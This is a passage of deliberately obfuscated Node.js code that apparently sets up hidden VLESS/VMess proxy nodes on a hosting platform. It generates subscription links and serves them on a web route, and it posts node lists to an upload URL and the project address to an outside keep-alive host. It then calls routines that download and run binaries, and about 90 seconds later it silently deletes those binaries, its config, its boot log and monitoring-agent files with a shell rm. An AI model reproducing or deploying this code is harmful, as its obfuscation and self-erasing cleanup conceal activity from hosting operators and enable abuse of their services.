_0x25f127={_0x477919:0xf9,_0x1b2f62:0x125,_0x2af01e:0x16f,_0x5015fb:0x16b,_0x110fa9:0xec,_0xb573f7:0x12d,_0x3a8c90:0x140,_0x1e6503:0x153,_0x92bb24:0xcd,_0x301744:0x126,_0x36053e:0xe3,_0x283aac:0x12d,_0x6e4924:0x11d},_0x34ac1e=await _0x2b985e(),_0x2370a6=NAME?NAME+'-'+_0x34ac1e:_0x34ac1e;return new Promise(_0x5b1f0c=>{setTimeout(()=>{const _0x45f49b={_0x1dfb9c:0xc3,_0x12aecb:0x15f,_0x484878:0x168},_0x5627c8=_0x3c74,_0x4ee374={'v':'2','ps':''+_0x2370a6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5627c8(0xf9),'net':'ws','type':_0x5627c8(_0x25f127._0x477919),'host':_0x103826,'path':_0x5627c8(_0x25f127._0x1b2f62),'tls':_0x5627c8(_0x25f127._0x2af01e),'sni':_0x103826,'alpn':'','fp':_0x5627c8(0x162)},_0x58da3e='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5627c8(_0x25f127._0x5015fb)+_0x103826+'&fp=firefox&type=ws&host='+_0x103826+_0x5627c8(0x134)+_0x2370a6+_0x5627c8(0x174)+Buffer[_0x5627c8(0xc3)](JSON[_0x5627c8(0xcb)](_0x4ee374))[_0x5627c8(_0x25f127._0x110fa9)](_0x5627c8(_0x25f127._0xb573f7))+_0x5627c8(_0x25f127._0x3a8c90)+UUID+'@'+CFIP+':'+CFPORT+_0x5627c8(_0x25f127._0x1e6503)+_0x103826+_0x5627c8(_0x25f127._0x92bb24)+_0x103826+_0x5627c8(_0x25f127._0x301744)+_0x2370a6+_0x5627c8(_0x25f127._0x36053e);console['log'](Buffer['from'](_0x58da3e)[_0x5627c8(_0x25f127._0x110fa9)](_0x5627c8(0x12d))),fs[_0x5627c8(0x10d)](subPath,Buffer[_0x5627c8(0xc3)](_0x58da3e)[_0x5627c8(0xec)](_0x5627c8(_0x25f127._0x283aac))),console['log'](FILE_PATH+_0x5627c8(0xde)),uploadNodes(),app[_0x5627c8(_0x25f127._0x6e4924)]('/'+SUB_PATH,(_0x5f0deb,_0x1c9ad7)=>{const _0x54417f=_0x5627c8,_0x3722d2=Buffer[_0x54417f(_0x45f49b._0x1dfb9c)](_0x58da3e)[_0x54417f(0xec)]('base64');_0x1c9ad7[_0x54417f(_0x45f49b._0x12aecb)](_0x54417f(_0x45f49b._0x484878),'text/plain;\x20charset=utf-8'),_0x1c9ad7[_0x54417f(0x145)](_0x3722d2);}),_0x5b1f0c(_0x58da3e);},0x7d0);});}}async function uploadNodes(){const _0x204ad7={_0x122775:0xdc,_0x537551:0x157,_0x1b0ffe:0xfc,_0xbac3e0:0x131,_0x562861:0xd3,_0x1751b4:0x17d,_0x2c701f:0x175,_0x525023:0x173,_0x252980:0xc1},_0x4c43d6=_0x4d6dfd;if(UPLOAD_URL&&PROJECT_URL){const _0x3d3105=PROJECT_URL+'/'+SUB_PATH,_0x5929fc={'subscription':[_0x3d3105]};try{const _0x3cadaf=await axios[_0x4c43d6(_0x204ad7._0x122775)](UPLOAD_URL+_0x4c43d6(0x138),_0x5929fc,{'headers':{'Content-Type':_0x4c43d6(_0x204ad7._0x537551)}});return _0x3cadaf&&_0x3cadaf[_0x4c43d6(_0x204ad7._0x1b0ffe)]===0xc8?(console['log'](_0x4c43d6(_0x204ad7._0xbac3e0)),_0x3cadaf):null;}catch(_0x398d36){if(_0x398d36['response']){if(_0x398d36[_0x4c43d6(_0x204ad7._0x562861)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4c43d6(0x169)](listPath))return;const _0x23df72=fs[_0x4c43d6(0x10f)](listPath,_0x4c43d6(_0x204ad7._0x1751b4)),_0x5a47a1=_0x23df72['split']('\x0a')[_0x4c43d6(0xd1)](_0x1157ac=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4c43d6(0x13d)](_0x1157ac));if(_0x5a47a1[_0x4c43d6(0x150)]===0x0)return;const _0x4f55a0=JSON[_0x4c43d6(0xcb)]({'nodes':_0x5a47a1});try{const _0x1066e4=await axios[_0x4c43d6(0xdc)](UPLOAD_URL+_0x4c43d6(_0x204ad7._0x2c701f),_0x4f55a0,{'headers':{'Content-Type':'application/json'}});return _0x1066e4&&_0x1066e4[_0x4c43d6(0xfc)]===0xc8?(console[_0x4c43d6(_0x204ad7._0x525023)](_0x4c43d6(_0x204ad7._0x252980)),_0x1066e4):null;}catch(_0x2054cd){return null;}}else return;}}function cleanFiles(){const _0x4629cd={_0x1c2488:0x179,_0x19f3e5:0x12e,_0x22cce3:0x179},_0x2c6f72={_0x36c3da:0xf5};setTimeout(()=>{const _0x2cbfae={_0x463462:0x163,_0x386a04:0x173},_0x50f21d=_0x3c74,_0x55a26e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x55a26e['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x55a26e['push'](phpPath);process['platform']===_0x50f21d(0x128)?exec(_0x50f21d(0x122)+_0x55a26e[_0x50f21d(_0x4629cd._0x1c2488)]('\x20')+_0x50f21d(_0x4629cd._0x19f3e5),_0x1fd68c=>{const _0x40aff3=_0x50f21d;console[_0x40aff3(_0x2cbfae._0x463462)](),console[_0x40aff3(0x173)](_0x40aff3(0xf5)),console[_0x40aff3(_0x2cbfae._0x386a04)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x50f21d(0x16c)+_0x55a26e[_0x50f21d(_0x4629cd._0x22cce3)]('\x20')+'\x20>/dev/null\x202>&1',_0x3336ab=>{const _0x5da469=_0x50f21d;console[_0x5da469(0x163)](),console[_0x5da469(0x173)](_0x5da469(_0x2c6f72._0x36c3da)),console[_0x5da469(0x173)](_0x5da469(0x132));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5159b2={_0x513c7c:0x116,_0x37fc29:0x157,_0x38ff18:0xe8,_0x1d62aa:0x13f},_0x4ebfff=_0x4d6dfd;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4ebfff(0x173)](_0x4ebfff(_0x5159b2._0x513c7c));return;}try{const _0x37355d=await axios[_0x4ebfff(0xdc)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4ebfff(_0x5159b2._0x37fc29)}});return console[_0x4ebfff(0x173)](_0x4ebfff(0x17b)),_0x37355d;}catch(_0xa5264b){return console[_0x4ebfff(_0x5159b2._0x38ff18)](_0x4ebfff(_0x5159b2._0x1d62aa)+_0xa5264b['message']),null;}}async function startserver(){const _0x4a7fb8=_0x4d6dfd;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3d0b39){console['error'](_0x4a7fb8(0xc4),_0x3d0b39);}}startserver()[_0x4d6dfd(0xe4)](_0x205c3e=>{const _0x597184=_0x4d6dfd;console[_0x597184(0xe8)]('Unhandled\x20error\x20in\x20startserver:',_0x205c3e);}),app[_0x4d6dfd(0x17e)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
